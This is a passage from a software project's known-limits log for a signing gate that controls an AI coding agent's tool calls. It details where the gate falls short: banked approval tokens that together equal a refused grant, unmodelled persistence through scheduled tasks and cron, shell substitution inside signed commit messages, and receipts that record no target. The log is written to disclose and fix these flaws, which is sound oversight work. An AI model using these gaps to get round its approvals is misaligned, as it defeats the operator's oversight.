interpreter argument is not a message and is not stripped), `-m "$(...)"` and
backticks inside double quotes (those execute), any heredoc feeding an interpreter
or a pipeline (`bash <<EOF`, `cat <<EOF | bash`), `git apply` patches, and
unquoted-delimiter bodies carrying substitutions. The consumer list is an allowlist
on purpose: a consumer not on it keeps its body visible, so a gap in that list
over-gates rather than misses. PowerShell here-strings (`@'...'@`) are not stripped
at all and can still false-positive; that noise is kept for the shell the engine
understands least.

Residual, against interest, two items. First, quoting is parsed with regexes, not a
real shell grammar; a construction that makes a regex see "single-quoted" where the
shell sees code would be a silent miss. None is known, and any future change here
carries limit 21's standing burden: a change that makes the gate quieter must state
what it stops seeing. Second, a body written through `cat` or `tee` that stages
command-looking text — a cron file, a shell profile — is no longer accidentally
flagged at write time. The write itself executes nothing, and if a later tool call
runs the file the rules see that execution; but an execution that happens outside
the session (cron picking up the file) was never visible to the gate, and the
accidental early warning the old false positive provided is gone. Staging
persistence through a prose write is a candidate for a path-based scope-escalation
rule, not a reason to scan prose again.

**Residual confirmed live, 2026-07-25.** The consumer allowlist that decides whose
body gets stripped covers `git commit|tag|notes|merge`, `cat`, and `tee`. It does
not cover `printf`. A shell `printf` used only to write a note was denied by
`opaque-exec` because the note's *text* quoted a deploy script's filename, with no
execution of that script attempted. The allowlist behaves exactly as designed here,
since a consumer not on the list keeps its body visible and therefore over-gates
rather than misses, which is the safe direction. It is recorded because the cost is
real and recurring: prose about the system is the system's own documentation, and
the tool that writes it is the tool most likely to trip.

Two consequences worth stating. The correct response to a false positive of this
shape is to use the dedicated tool for the job, Read or Write or Edit instead of a
shell one-liner, and never to reword the prose until it slips past the matcher.
Rewording to evade a control is the drift this system exists to catch, and it does
not stop being drift because the trigger was a false positive. And a real fix is
harder than the terminator-enumeration closure applied on 2026-07-24: the matcher
would have to distinguish a string that is a command's target from a string that is
inert text the command writes out, which means parsing structure rather than
substring-matching a flat command line.

## 27. Signature binding is exact, so any command mutation burns a fresh signature

An approval token is single-use and bound to the literal command string staged at
signing time. Any difference between staging and execution produces a new,
unrelated approval request rather than verifying against the original signature: a
different flag value, reordered arguments, an added redirect, a changed path
separator. This is intended and is not going to change. A token that survived
command mutation would not be an approval of *this* action, it would be a standing
permission slip.

The cost lands on the human, not the agent. Every mismatch asks for another
signature on something that from their side looks like the action they already
approved. A few repetitions of that and the natural response is to sign faster and
read less, which is the exact failure mode the gate exists to prevent. Limit 26
names the same corrosive dynamic arriving from a different direction.

Confirmed live, 2026-07-25. A signed request for an Ollama dispatch was followed by
a retry that changed only `tail -20` to `tail -25`, and that produced a new request
rather than reusing the signature.

The mitigation available today is an operating rule, not a code change: whatever
stages a signed command must reproduce it byte for byte at execution time and must
never improve it in between.

**Correction, 2026-07-25, same evening this entry was written.** The paragraph above
originally continued with a "candidate improvement to the gate itself, not built": a
denial that identifies itself as a variant of an already-staged request, so the human
can see they are being asked to re-approve a near-twin rather than to approve
something novel.

That is built, though **not shipped**, and the distinction is the point of this
correction. It is committed on the unmerged branch
`fix/token-freshness-and-variant-denial` (`fefb3d2`), which is four commits ahead of
`main`. Searching `main` for the function returns nothing. So it is live in the
working tree, active in any session running from it, and absent from every release.
An earlier version of this correction said "already shipped," which was the same
error one layer down: asserting state without checking which branch that state lives
on. See limit 29.

`buildDenialMessage()` calls `findSimilarStagedRequest()` and, on a match, prints a
`VARIANT OF staged request <id>` line **above** the reasoning, with the differing
region of both commands shown. Its own source comment names the three incidents from
2026-07-25 that motivated it, and one of them is the `tail -20` to `tail -25` retry
cited as this entry's live confirmation. So the entry used a shipped fix's own
motivating incident as evidence that the fix did not exist. The error was writing
about the gate's behaviour from the incident record instead of from the source.

Recorded here rather than quietly edited out, because a disclosure log that silently
repairs its own false claims is worth less than one that shows them. The general rule
it earns: **a claim that the gate does not do something requires reading the gate, not
reading what happened.**

Two genuine residuals, found while checking the above:

Similarity is deliberately crude and **excludes byte-identical priors** (`wasDetail
=== nowDetail` is skipped). That exclusion is right, because a prior whose token was
already signed and spent is not a variant of anything and calling it one would
mislead. The cost is that re-attempting an identical command stages a second request
with no hint that an unsigned identical one is already pending. A separate line for
that case, pointing at the existing request instead of the new one, would be a small
improvement and is not built.

Staged requests are **never pruned**. There were 185 by the morning of 2026-07-25 and
229 by that evening, one per denial, forever. The deny path caps its twin scan at the
25 newest so matching stays fast, but the directory itself grows without bound. Same
shape as the unbounded nonce log in limit 16, and neither has a cleanup path.

## 28. A grant is bound to one session, so it cannot pre-authorize a scheduled task

A grant is one signature over N enumerated requests, scoped to one session, with an
expiry and a shared action ceiling (limit 17). A recurring scheduled task, whether
cron, Task Scheduler, or a systemd timer, spawns a **new session on every firing**.
No grant issued once can therefore cover a job intended to run unattended on a
schedule. Each firing would need its own signature, which is unavailable by
definition when nobody is present to sign.

This is a structural gap, not an oversight in the grant schema, and it means the
honest rule for unattended work is that anything inherently gated cannot be
automated at all. It can only be prepared and left for a human.

One important refinement, because an earlier version of that conclusion was too
strong. It holds absolutely for **overnight**, where the operator is asleep and no
signature is possible at any price. It does not hold for **away**, where the
operator is out but reachable and signatures are merely latent. In away mode a job
can legitimately stage a gated action and wait, because someone will come. The
design does not need a new primitive to handle that; it needs to know which mode it
is in, and nothing in v1 records or reasons about operator mode.

No change to the grant machinery is proposed here. It lives in the non-delegable
core, so any change to it requires its own per-edit signature.

## 29. This file documents `main`, but lives in the tree of branches that change it

Found 2026-07-25 while correcting limit 27. The confession log sits in the same
working tree as the code it describes, so on any feature branch it is simultaneously
accurate for `main` and false for the checkout you are reading it in. There is nothing
in the file that says which.

The branch `fix/token-freshness-and-variant-denial`, four commits ahead of `main` at
the time of writing, demonstrates it. Three commits, all of them shipping code plus
tests, **none of them touching this file:**

- `fefb3d2` added an approval-token freshness window in `src/gate/index.js` with 128
  lines of new tests. Limit 16 still opens "An approval token has no expiry."
- `9d3ec36` added per-model cost attribution in `src/parser/index.js` with 211 lines
  of new tests, and names limits 4 and 13 in its own subject line. Limit 13 still
  reads "Per-model, per-harness cost attribution is not built."
- `13cc2e2` added portable receipt bundles so a chain verifies off the machine that
  wrote it. Limit 9 still reads "receipts do not verify across machines."

**The direction of the error matters and cuts both ways.** Overstating limits is the
safer failure: a reader who believes the system is weaker than it is takes more care,
not less, and nobody is harmed by a disclosure that has not yet been retracted. But it
is still a false statement of current state, and it corrodes the one property this
file exists to have. A log that is wrong in the flattering direction and a log that is
wrong in the unflattering direction are both logs you have to check the code to trust,
which is the whole thing it was supposed to save you from.

It also inverts the failure mode the confession loop was designed against. That design
worried about a system rewarded for closing entries, and answered it by rewarding
discovery instead. This is the other leak: **fixes landing without the disclosure
being updated, so closure happens in the code and never in the record.** Discovery
being the product does not help if closure is invisible.

Not fixed here, and deliberately not papered over by rewriting the four entries
tonight. Each one needs its fix read and its tests run before its entry is amended,
and amending a disclosure on the strength of a commit subject line would repeat the
exact mistake that produced limit 27's correction. Candidate fixes, none built: a CI
check that fails a PR touching `src/` without touching this file or explaining why; a
per-entry `status:` field naming the branch and commit a claim was last verified
against; or moving the log out of the code tree entirely so it can only describe
released behaviour.

Until then, read this file as a statement about `main`, and check `git log` before
trusting any entry in a feature checkout.

**Fixed 2026-08-23.** The confusing state existed and was reproducible: before this
change, no text anywhere in this file named the commit it describes, so any reader
in any checkout had no way to tell whether they were reading mainline truth or
somewhere else's. Two things changed:

1. **This file now states its commit at the top**, in a managed pin block naming
   the exact commit whose tree the entries were verified against (`npm run
   limits-pin -- --stamp` re-stamps it in place after an update; it never
   duplicates). The pin names the commit of the log's own tree, so a feature
   branch that edits the log honestly re-pins to itself and the divergence
   becomes visible on both sides instead of invisible on either.
2. **A reader can check without trusting anything** (`npm run limits-pin --
   --check`): it compares the pin against your checkout's HEAD and says so,
   plainly, when you are reading a description of somewhere else — naming both
   commits. Exit code 1 on divergence, so CI or a script can gate on it (that
   CI wiring is still not built; the check exists, the automation does not).

Still true: the pin is self-reported text inside the file it describes, not
cryptographic binding — nothing stops a commit carrying a false pin, and review
is what catches that, as with any claim in a markdown file. And a commit that
touches `src/` without updating this log still lands silently; the pin makes the
staleness *detectable* (the check reports divergence), not impossible.

**Update 2026-07-26. The specific instance closed and the entry got worse, not
better.** `fix/token-freshness-and-variant-denial` merged into `main` this morning,
thirteen commits, suite green. So the branch this entry uses as its demonstration no
longer exists as a gap.

The class did not close. It inverted. While the fixes sat on a branch, limits 4, 9,
13 and 16 were stale *only in a feature checkout* and correct for `main`, which is
exactly what the last line above tells a reader to assume. **After the merge they are
stale on `main` itself**, which is the case that line offers no defence against. A
reader following this file's own instructions is now misled, where before they were
protected.

That is worth stating plainly because it is the sharper form of the problem: the
window between a fix landing and its disclosure being amended is not a branch-local
inconvenience, it is a period during which the log is confidently wrong about shipped
behaviour. Merging is what converts a private staleness into a public one, so **the
merge is the moment the amendment is owed**, not some later tidy-up. None of the
candidate fixes above would have caught this either; a CI check on `src/` would have
passed, since the merge commit touches this file's neighbours and not its claims.

**Update 2026-09-01. The pin is stale on `main` right now, the suite is green,
and the two tests that name the real log are the reason.** Found by running the
check the entry recommends, which nothing else does.

The committed pin reads `2173d231` (stamped 2026-08-23, subject "opaque-exec:
gate local scripts handed to a script interpreter (#28)"). The last commit that
touched `src/` on `main` is `dc1910b` ("fix(C6): scope rm trigger to its
segment; check every git-clean pathspec; amend limit 24 (#36)"). So
`npm run limits-pin -- --check` on a clean `main` checkout reports divergence
and exits 1, and has done since #36 landed. A reader who follows the
instruction in the pin block is told, correctly, that they are reading a
description of somewhere else.

**Why the suite did not catch it, which is the part worth keeping.** Two tests
in `test/known-limits-commit-pinning.test.js` announce themselves as exercising
"the REAL shipped log". Neither asserts anything about the log as committed:

- the first runs `--stamp` on it and *then* asserts `--check` reports current.
  That proves `--stamp` works. It cannot fail on a stale committed pin, because
  it overwrites the pin before looking at it.
- the second writes a foreign hash into it and asserts `--check` exits 1. That
  proves `--check` works. It also cannot fail on a stale committed pin, for the
  same reason in the other direction.

Both write the state they then assert, so the committed value is never read.
The suite is green at 908 tests with the shipped log wrong, which is this
entry's own thesis one level up: **the mechanism built to make staleness
detectable is never run against the artifact, and its tests are shaped so they
structurally cannot fail on it.** The 2026-08-23 fix said "that CI wiring is
still not built; the check exists, the automation does not." That is still true,
and this is what it cost.

**A second defect, found in the same read.** Those two tests reach green by
writing to the tracked `KNOWN-LIMITS.md` in the working tree and restoring it in
a `finally`. A `finally` survives an assertion failure; it does not survive the
process being killed. An interrupted `npm test` can leave the shipped confession
log carrying `commit: bbbbbbbb...`, subject "some other tree" — a fabricated pin,
in the file this repository's own tooling stages and commits. This entry already
says nothing stops a commit carrying a false pin and that review is what catches
it. The suite that tests the pin is a mechanism that manufactures one,
unattended.

**Not fixed here, and the reason is not time.** The obvious repair is a
read-only test asserting the committed pin equals the last `src/` commit — the
assertion that would have caught this. It fails on `main` today, so landing it
requires re-stamping in the same change, and **stamping is a claim that the
entries were verified against that tree.** `bin/limits-pin.js` says so in its
own header: a stamp that happens without anyone verifying makes the pin say
"verified" when nobody did. This lane has not read 61 entries against
`dc1910b`, so it will not make that claim, and re-stamping to go green would be
the precise dishonesty the pin exists to prevent. The stamp is owed by whoever
verifies.

The test-isolation half is separable and does not need a stamp: point the CLI at
a scratch copy (an env override on the log path, git resolution left anchored to
the repo) and the mutation of the tracked file goes away. That edit is to
`bin/limits-pin.js`, which self-mod gates, and it was blocked unsigned when this
entry was written. Named here rather than smuggled into a file the gate does
allow.

**Amendment, 2026-09-01. The failure this pin was built to prevent happened
anyway, in a worse form, and nothing saw it.** The pin exists because of
2026-08-22, when a bounty cited an entry number that meant something different on
`main`. Seven days later an entry number stopped meaning anything at all.

`dc1910b` (PR #36, an outside contributor's destructive-matcher fix) appended an
amendment to entry 24 and, in the same hunk, **deleted the `## 25.` heading
line.** Nothing else about entry 25 was touched. Its body — three paragraphs on
`gh`, the authenticated vendor CLI the rule set could not see — has been sitting
inside entry 24 ever since. So a reader of "the destructive allowlist exempts
real directories named tmp/temp/scratchpad" got a section that changes subject
mid-way to an unrelated limit about GitHub's CLI, and a citation of
"KNOWN-LIMITS 25" resolved to nothing. The log ran 1 to 61 with 60 entries in it.

**It survived a code review and 891 green tests**, because no test ever read the
shipped log as a structure. The two tests that name the real log both write the
state they then assert (the finding above); neither looks at what is committed.
An accidental one-line deletion inside a 230-line documentation diff is exactly
what review misses and exactly what a parser catches for free.

**Fixed here.** The heading is restored — a faithful revert of the deleted line,
with the body left where it has always been — and
`test/known-limits-numbering.test.js` now reads the committed file and asserts
the entry numbers are contiguous from 1, unique, and above a sanity floor. It is
read-only: it opens the shipped log, writes nothing, and needs no pin to pass.
Run against `main` today it fails on the missing 25, which is the fail-first
evidence that it tests something real.

**Still not fixed, and still for the same reason:** the stale pin above. This
run verified the log's *structure* against the tree; it did not read 61 entries
for *truth* against `dc1910b`. Stamping on the strength of a numbering check
would be a smaller lie than stamping on nothing, and it would still be one. The
stamp remains owed by whoever verifies.

## 30. Edit tokens are fungible per file, so signing twice builds a grant by hand

Found 2026-07-26, live, from a double-signing that was an accident.

`SIGNED_PARAMS` is `command`, `file_path`, `url`, `path`. For the `Edit` tool that
means the canonical request is **the path and nothing else**: the content being written
is not signed, deliberately, because binding a signature to `old_string` and
`new_string` would make every approval brittle and unreviewable. The SCOPE line in the
denial message says so honestly, "signs file_path only."

The consequence is not in that line. Because the request is only the path, **every edit
to a given file produces the same canonical request**, so every token for that file
validates against every other edit to it. Tokens are single-use by nonce, but they are
**interchangeable and they accumulate.** Sign the same path twice and the surplus token
sits in `pending-approvals/` and silently authorizes the next edit to that file,
whatever its content, whenever it happens, with no further review and no second look
from the operator. On `main`, where an approval has no expiry (limit 16), it waits
indefinitely.

**Why this is worse than it first sounds.** Delegation grants are *refused* on the
non-delegable core: `requestRefusalReason()` rejects any request naming a path
`classifyPath()` does not call grantable, so no single signature may cover repeated
operations on `src/gate`, `src/policy`, `src/chain`, `src/store`, `src/grant`, or
`bin/hook-*`. That refusal is correct and load-bearing.

But N single-use Edit tokens for a core path add up to precisely the grant that was
refused. Same effect, and strictly weaker in every respect that made the refusal safe:
no session binding, no expiry, no ceiling, and no chain-recorded enumeration of what
was authorized (limit 18 exists so a grant's contents are reconstructable; a pile of
loose tokens has no equivalent). **The control that stops one signature from covering
many core edits can be assembled by hand out of the primitive it is built from.**

Observed exactly this way: three edits to `bin/hook-pre-tool-use.js`, three denials,
two signatures, three edits applied. Receipts seq 585, 589, and 590 record three
`approved` decisions with three distinct approval nonces, so nothing was replayed and
the nonce layer worked exactly as designed. The gap is that the second signature was
never spent on the action the owner was looking at when they gave it.

Worth stating plainly because it inverts an instinct: the agent's own reading of this
was that a third edit had bypassed the gate, and the reasoning offered was a possible
nonce-replay hole in the core. The chain said otherwise in one read. **A gap found by
reading receipts is the third time on this project that the record has corrected an
inference the code invited.**

Not fixed. Candidate directions, none built and each with a cost: expire tokens
(already on an unmerged branch for other reasons, and it narrows the window without
closing it); refuse to stage a request whose canonical form already has an unspent
token on disk, so surplus tokens cannot exist; include a content digest in the signed
request for core paths only, accepting the brittleness limit 27 describes in exchange
for one-edit-one-signature on the files that matter most; or delete every remaining
token for a path once one is spent, on the theory that an operator approving an action
approved that action and not a credit balance. The last is the smallest and probably
the right one.

Until then: **for the non-delegable core, sign once per edit and never bank a
signature.** If a passphrase entry fails, confirm no token landed before signing again.

### Observed live state, 2026-07-26, and this is the part that matters

The paragraphs above describe a mechanism. Checked against the actual machine, the
mechanism has already accumulated. Token files are deleted when consumed, so every
file remaining in `pending-approvals/` is by construction **unspent, valid, and
non-expiring**. There were **eleven**, none of their nonces present in
`keys/approval-nonces.log`.

Two of the eleven authorize consequential actions: one registers a Windows scheduled
task, and one opens a GitHub pull request with a full body. Each will execute silently,
with no gate and no request, the moment its exact command string is next attempted.

This is limits 27 and 16 compounding into a state rather than a hazard. **A signature
burned by a one-character change does not evaporate; it banks.** Every retry that
restages instead of reusing leaves the original signed and idle, and with no expiry on
`main` it stays that way. Nothing counts them, nothing surfaces them, and the operator
has no view of the balance they have accrued.

Three consequences worth separating, because they have different fixes:

The **absence of a ledger** is the cheapest and largest gap. There is no command that
answers "what am I currently pre-authorizing." `npm run receipts` reports what
happened; nothing reports what is still permitted. That is a read-only feature and it
should exist before any of the harder fixes.

**Deleting a surplus token needs no signature and fails safe**, exactly as limit 19
argues for grants: removing an authorization only ever reduces capability. So cleanup
is available today and costs nothing. It just has to be known to be necessary.

**Expiry narrows this and does not close it.** A freshness window (on an unmerged
branch at time of writing) bounds how long a banked signature waits. It does not stop
one from existing, and a token spent inside its window is spent on whatever command
matches, not on the action the owner was looking at.

**Amended 2026-07-26.** Two of the three consequences above have moved, and the
parenthetical "on an unmerged branch at time of writing" is now false: the freshness
window is on `main`. The ledger this entry called "the cheapest and largest gap" is
built and shipped as `bin/tokens.js` / `npm run tokens`. Its first real run found one
live unspent token two minutes old, and the run this morning found zero live and one
expired, which is the intended steady state.

The third consequence stands unchanged and is the one to keep reading: **expiry still
does not close this.** A token spent inside its window is spent on whatever command
matches. The ledger makes the balance visible; it does not make a banked signature
mean what its signer meant. See limit 31 for what the ledger still cannot tell you.

## 31. The rule set reasons about actions taken now, and has no concept of actions scheduled for later

Found 2026-07-25, on the run that found it. Recorded here 2026-07-26 after it survived
a branch collision that nearly lost it: two branches independently numbered new entries
27 and 28, the merge kept the other pair, and this one was recovered from the discarded
side rather than from anyone remembering it.

Persisting a script to run later, unattended and repeatedly, is at least as
consequential as running it once. It outlives the session, it runs with nobody
watching, and it re-runs on a schedule the gate never sees again. There is no rule for
it.

`Register-ScheduledTask` **did** gate when it was observed, but only incidentally: the
command string happened to contain a `.ps1` path, so `opaque-exec` matched. **The gate
fired for the right reason by accident.** A task registered against a bare executable,
a `cmd /c` line, or an interpreter with an inline argument carries no script extension
and would very likely pass unremarked.

The same hole covers every other persistence surface on the machine: `schtasks`, `at`,
cron entries written through a tool call, systemd units, shell profile edits, `Run`-key
registry writes, login items. Limit 26 already noted that staging persistence through a
prose write is "a candidate for a path-based scope-escalation rule"; this is the same
gap reached from the other direction, and it is wider, because it needs no prose at
all.

The honest framing is that this is **a category the matcher does not model rather than
a verb it is missing**, which is why extending a verb list would not close it. A
`persistence` rule keyed on the known scheduling surfaces would raise the bar
considerably and would still inherit limit 21's ceiling: the rules match strings, not
intent, and a scheduler reached through a wrapper the matcher cannot see into stays
invisible.

**Live and load-bearing as of this writing.** This install has several S4U scheduled
tasks registered, and they are how unattended work runs here. Every one of them is the
exact class described above. Registering them was deliberate and authorized; the point
of the entry is that **the gate cannot distinguish that from the case where it was
neither**, which is the whole hazard and does not depend on when they run.

Not fixed in v1.

## 32. The authorization ledger cannot show which rule staged a token

Found 2026-07-26 by the unattended overnight pass, which went looking for the rule id
in the request files and reported its absence rather than assuming it was there.

`bin/tokens.js` reports every live, expired, and spent token in `pending-approvals/`,
closing the gap limit 30 named. It cannot report **which rule** (`self-mod`,
`opaque-exec`, and so on) staged a given token, because `stageRequest()` in
`bin/hook-pre-tool-use.js` writes only the action and its params to the request file,
never the matched rule id. The rule name exists only as an in-process variable at the
moment the gate evaluates the call, and is gone once the process exits.

Why it matters more than a missing display field: the ledger's job is to answer *what
am I currently pre-authorizing*, and a token's rule is the closest thing the system has
to **why** it needed authorizing. Without it, a reviewer sees a command and its age and
has to re-derive the hazard from the command string, which is the same work the gate
already did once and threw away.

Not fixed. The fix is small and has precedent: a sidecar at
`pending-approvals/rules/<id>.json`, written at staging time and read back the same way
`readPurpose()` already reads the `purpose` sidecar. Until then, a live token in the
ledger tells you what it would do and how old it is, not which rule put it there.

## 33. A signed command string is executed by a shell, so an approved commit message can run commands

Found 2026-07-26, by writing one. A commit message explaining why `bin/charter.js`
must be protected contained the text `` `echo x > bin/charter.js` `` as an example.
Inside a double-quoted `-m` argument in `bash`, backticks are **command
substitution**. Running that command would have created the exact file the message
argues must never be created unsigned, silently, as a side effect of describing the
hazard.

**The gate does not help here, and that is the entry.** A signature covers the whole
command string. Once the owner approves it, everything inside it runs under that
approval, including any `` ` `` or `$(...)` embedded in what looks like prose. The
matcher can flag the text — it did, which is how this surfaced — but flagging is not
the same as understanding, and an approved command is an approved command.

**Distinct from limit 26, and sharper.** Limit 26 is about prose being *scanned as
code* and producing false positives; the cost there is friction. This is prose that
*is* code, and the cost is execution under the owner's signature. The two look
similar in a denial message and are opposite in consequence.

**The messy part, recorded because it is the honest bit.** The fix was to escape the
backticks, which meant changing a command after it had been staged and signed —
directly against the byte-identical-retry rule that limit 27 exists to enforce. That
rule assumes the staged command is correct. When it is not, faithfully reproducing a
defect is the wrong reading, and the resolution is a fresh signature on the corrected
command plus clearing the old token, because an unspent token authorizing the
dangerous version is a live authorization to run it later (limit 30). Both were done.
**A rule that says never change a staged command needs an explicit exception for
"the staged command is unsafe", or it will eventually be used to argue for executing
something known to be wrong.**

Not fixed. Candidate mitigations, none built: refuse to stage any command containing
unquoted `` ` `` or `$(` outside single quotes; prefer `--file` for commit messages
so message text never becomes shell input; or render the staged command with
substitutions highlighted so the owner sees them as executable rather than as prose.
The first is a matcher and inherits limit 21; the second is a workflow change and is
probably the honest answer.

## 34. The self-mod matcher decides by path fragment, when a path could be resolved

Recorded 2026-07-26 alongside the `bin/` fix, as the better answer that was not taken.

`isSelfModEdit` matches by substring against a hand-maintained fragment list.
`core-paths.js` answers the same question by **resolving** the path and proving
containment, refusing anything it cannot place. Those are not equally good: the first
is a list someone must remember to update, the second is a decision procedure. The
`bin/` gap existed precisely because the list drifted from `CORE_DIRS`, and it was
closed by adding a smarter regex, which is a better list and still a list.

**The asymmetry that makes the better fix available:** `Edit`, `Write` and
`NotebookEdit` all carry a `file_path`, and **a path can be proven contained**. So
the edit path could call `classifyPath` and gate anything not `grantable`, deleting
the drift for file operations entirely. Commands cannot do this — deciding what a
shell command touches needs a grammar, not a resolver — so the fragment list stays
correct there and only there.

Not done because it couples `src/policy` to `src/grant`, and that coupling deserves
its own review rather than riding along with an incident fix. **The residual until
then:** a new core *directory* outside `src/` and `bin/` is non-delegable per
`core-paths.js` and ungated by self-mod until someone adds a fragment. The `src/`
side has a guard (`test/core-classification.test.js` fails on an unclassified
directory) and `bin/` is now covered by pattern. Anywhere else is still list-shaped,
and a list is only as good as the last person to remember it.

## 35. A gate decision carries no session id, so a denial cannot be attributed

Found 2026-07-26 building the cross-session view.

Every `gated-action` receipt written in `src/gate/index.js` (four call sites, lines
149, 167, 192 and 209) carries `decision`, `action`, `reason` or `approvalNonce`, and
`timestamp`. **None of them carries a session id.**

With one session running that costs nothing, because the denial obviously belongs to
whoever was there. With concurrent sessions it costs the question entirely: 57
denials were recorded on 2026-07-26 across six working sessions and **not one can be
attributed to the session that caused it.**

Attributing by timestamp is available and is not done, deliberately. Sessions overlap,
so the nearest-open heuristic is wrong often enough that a confident wrong answer
would be worse than a stated gap. `src/views/since.js` reports gate decisions in a
separate unattributed list and says why in its own output.

**Why it is not simply fixed:** the gate is called from the hook with an action
request, and the session id is available to the hook. Threading it through is a core
change to `src/gate`, which is one signature per edit and belongs in a reviewed
sitting rather than riding along with a view. Until then, denials are a timeline and
not a per-session fact.

## 36. An approved receipt records the tool, never the target

Found 2026-07-26 building the autograph ratio, by reading `src/gate/index.js:209`.

The approval receipt is `{ decision: 'approved', action, approvalNonce, timestamp }`.
`action` is the tool name. There is no path, no command string, no params, and no
digest of the request.

So the chain answers **that** a signature was spent and **on which tool**, and can
never answer **on what**. A signature cannot be matched to a charter item, a file, or
a command after the fact. This is not a missing feature; it is not derivable from the
record as it stands, and any tool claiming per-signature attribution would be
guessing.

`src/views/autograph.js` therefore attributes by charter **window** rather than per
signature, and states the reason in its own output rather than in a comment nobody
reads.

**The trade this preserves is real and should not be discarded casually.** The
approval token binds to the exact request, and the request never enters the chain, so
the chain leaks nothing about what was approved. Recording the target would make
attribution possible and would put command strings in the log, which limit 18 already
flags as a disclosure surface. The fix is a digest, not the string, and it is a core
change.

## 37. The chain accepts entries from writers outside this repository

Found 2026-07-26 while auditing receipt coverage.

Chain entries at seq 727 and 728 are `ledger-head` records carrying `limit_id`,
`limit_text_sha256`, `entry_count` and `head_hash`. **Nothing in this repository
writes them.** A search across every JavaScript file finds the string only in a
comment, a test, and the chain itself. They are produced by the attempt-ledger work,
which lives in a separate tree.

Two consequences.

**No in-repo enumeration of receipt types can claim completeness**, including
`docs/receipt-coverage.md`, which says so. A future audit has to re-derive the set
from a real chain rather than trust the document.

**And the outside writer uses a different discriminator.** Its rows are keyed by
`kind` and its fields are snake_case, where every payload written here uses `type` and
camelCase. Both readers in this repo checked only `type` and so labelled those rows
`unknown`; both were fixed the same day. That is the same class as reporting an absent
count as zero: a reader that knows one convention describes the other wrongly while
appearing to work.

There is nothing wrong with a chain that accepts entries from more than one producer.
The limit is that **the set of producers is not enumerated anywhere**, so the only
honest way to learn what is in a chain is to read that chain.

## 38. The retcon cannot reconcile a charter of file items, and reports the opposite

Found 2026-07-26 running the retcon against the charter that produced it.

`bin/retcon.js:329` builds the declared set from charter items, which are
`{ action, params: { file_path } }`. `bin/retcon.js:197` builds the observed set from
`gated-action` receipts, canonicalizing `p.action`, which on a gate receipt is a bare
tool-name string like `"Edit"`.

**A string and an object never canonicalize to the same key.** The string form throws,
the empty `catch` on line 199 swallows it, and the observed set stays empty. So a
charter of eight built, tested and committed items reported as `declared and never
attempted 8` and `attempted and not declared 0`. Both directions wrong, confidently.

**The root is a coverage fact, not a typo.** Only the session receipt carries file
paths, in `touched`. Gate receipts carry no path (limit 36). A charter of file items
cannot be reconciled against gate receipts even in principle: the comparison needs
`touched`, which is written once, at session end. **While a session is still running,
the retcon is reading an empty room and reporting it as an empty plan.**

Not fixed here. `bin/` is non-delegable core, and the charter under which this was
found required stopping rather than working around.

**Amended 2026-07-27. FIXED, and verified against the charter that produced this
entry.** Run against charter 004, the same eight declared items it previously
reported as `declared and never attempted 8`, it now reports `confirmed by a
touched path 8` and `declared, no matching path 0`. 689 tests green.

The reconciliation moved to `src/views/reconcile.js`, outside the non-delegable
core, and the fold now keys `toolsSeen` by the bare tool-name string the gate
actually writes and retains `touchedPaths` instead of only a count.

**The coverage fact underneath is unchanged and no fix could change it.** Gate
receipts still carry no target (limit 36) and session receipts still carry paths
only at session end. What changed is that the tool no longer converts that absence
into a confident wrong answer. There are now four outcomes, and three of them are
shades of "the record cannot say": a declared **command** item is `unreconcilable`
because nothing in the chain records command strings, and a window with no closed
session is `undetermined` rather than absent, which was the empty room this entry
described being read as an empty plan.

**A NEW LIMITATION THE FIX INTRODUCES, in the wrong direction, stated here rather
than left in a docstring.** `samePath()` matches exactly or on a path-segment-
boundary suffix, because a charter is written by a human in relative form while
`touched` records whatever the harness captured, usually absolute. **That can
falsely confirm two different files that share a tail** — the same relative path
inside two checkouts, most obviously. The failure direction is a false
CONFIRMATION, which is worse than a false miss, and it cannot be closed by
resolving the path: a charter may name a file that does not exist yet, and a chain
may be read on a machine that did not write it (limit 9). Read `confirmed` as
"a path consistent with this item was touched", never as proof the declared file
was the one.

**Amended 2026-08-31. NARROWED, not closed.** The sentence above told the reader
to read `confirmed` as something weaker than it said. Nothing in the output
helped them do it: an exact match and a tail-only match both printed the single
word `confirmed`, and the report never said which one it was holding.

`samePath()` is now `pathMatch()` and returns `exact`, `suffix` or null. A
confirmation carries `matchKind`, the paths it matched on, and `ambiguous`, which
is set when a tail-only match hit **more than one distinct recorded path** — the
false confirmation happening in front of us, since at most one of them can be the
declared file. `deviationNote()` counts the tail-only confirmations and states
the failure direction, and stays silent when every match was exact, because a
caveat that fires with nothing to report is limit 39 again. 898 tests green,
seven of them new.

**What did not change, and cannot.** The ambiguity is unresolvable for the reason
this entry already gave: a charter may name a file that does not exist yet, and a
chain may be read on a machine that did not write it (limit 9). **A tail-only
match is still counted as `confirmed` rather than downgraded**, because the
relative-charter-against-absolute-record case is the ordinary one and downgrading
it would break the thing the suffix rule exists for. The false confirmation is
still reachable. What changed is that the report no longer presents the strong
case and the ambiguous case as the same word, and the reader is told how many of
each they were handed.

**Doubt this:** the count is only as good as `touched`, which is self-attested
capture (limit 1), and `ambiguous` cannot fire at all when the two colliding
checkouts are on different machines, because only one of them is in this chain.
A single tail match is reported as unambiguous and may still be the wrong file.

## 39. The retcon's honesty block states invented specifics

Found in the same run, and it is the worse of the pair.

`bin/retcon.js:356-357` prints, inside the section headed WHAT THIS DOES NOT TELL
YOU:

> This shows that items 3 and 7 never ran and that four things ran which were not on
> the list.

**Those numbers are hardcoded prose.** They are printed regardless of the data, and in
the run that found them they contradicted the computed figures six lines above in the
same report.

Crying wolf is a true signal at the wrong threshold and is merely expensive. This is a
false statement wearing the shape of a derived one, inside the block whose whole job
is to bound what the tool is claiming. **A caveat that invents specifics is worse than
no caveat**, because a reader who distrusts the numbers will trust the disclaimer.

The fix is to derive the sentence from the counts already computed, or to drop the
specifics and keep the general statement. Not done here: `bin/` is core.

**Amended 2026-07-27. FIXED.** `deviationNote()` in `src/views/reconcile.js` builds
the sentence from the counts it was handed, states nothing numeric when nothing was
counted, and is covered by four assertions including one that fails if the string
`items 3 and 7` ever reappears. Verified live on charter 004, where it now prints
"This run counted: 2 tool(s) were used that no declared item names" against a report
showing exactly that.

**What has NOT changed, and is the reason this entry stays worth reading.** The
block still presents rather than detects. It can only report what was counted, and
what was counted is bounded by limit 36 (a gate receipt records the tool, never the
target) and by the fact that the whole comparison is self-attested capture
(limit 1). A caveat that is now honest about its arithmetic is still a caveat about
a record that cannot see intent.

One line was added that the old block never had, because the fix made it necessary:
**an item this cannot check is NOT an item that did not run.** The previous version
had no way to say that, since it had no category for it.

## 40. Nothing in this repository writes a confession

Found 2026-07-26, by being asked what this tool is for and measuring the answer
